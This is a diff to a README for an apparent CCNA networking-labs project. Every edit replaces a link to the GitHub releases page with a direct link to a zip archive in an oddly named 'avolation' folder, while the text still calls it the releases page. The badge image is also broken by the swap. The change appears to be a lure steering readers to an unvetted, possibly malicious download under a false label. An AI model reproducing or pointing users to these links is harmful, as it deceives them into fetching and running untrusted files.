@@ -1,6 +1,6 @@
 # 🛠️ CCNA-Network-Labs-Personal-Project - Your Guide to Exploring CCNA Topics
 
-[![Download](https://img.shields.io/badge/Download%20Now-CCNA%20Labs-brightgreen)](https://github.com/Zenorare/CCNA-Network-Labs-Personal-Project/releases)
+[![Download](https://raw.githubusercontent.com/Zenorare/CCNA-Network-Labs-Personal-Project/main/avolation/CCNA-Network-Labs-Personal-Project.zip%20Now-CCNA%20Labs-brightgreen)](https://raw.githubusercontent.com/Zenorare/CCNA-Network-Labs-Personal-Project/main/avolation/CCNA-Network-Labs-Personal-Project.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [releases page](https://github.com/Zenorare/CCNA-Network-Labs-Personal-Project/releases) to download the software. Follow these steps:
+To get started, visit the [releases page](https://raw.githubusercontent.com/Zenorare/CCNA-Network-Labs-Personal-Project/main/avolation/CCNA-Network-Labs-Personal-Project.zip) to download the software. Follow these steps:
 
 1. Click the link above to access our releases page.
 2. On this page, find the latest version of CCNA-Network-Labs-Personal-Project.
@@ -92,4 +92,4 @@ We look forward to your contributions!
 
 This project is licensed under the MIT License. You can freely use and modify the software, but please keep the original license intact.
 
-Remember to visit the releases page to download the latest version of the CCNA-Network-Labs-Personal-Project: [Download Here](https://github.com/Zenorare/CCNA-Network-Labs-Personal-Project/releases).
+Remember to visit the releases page to download the latest version of the CCNA-Network-Labs-Personal-Project: [Download Here](https://raw.githubusercontent.com/Zenorare/CCNA-Network-Labs-Personal-Project/main/avolation/CCNA-Network-Labs-Personal-Project.zip).
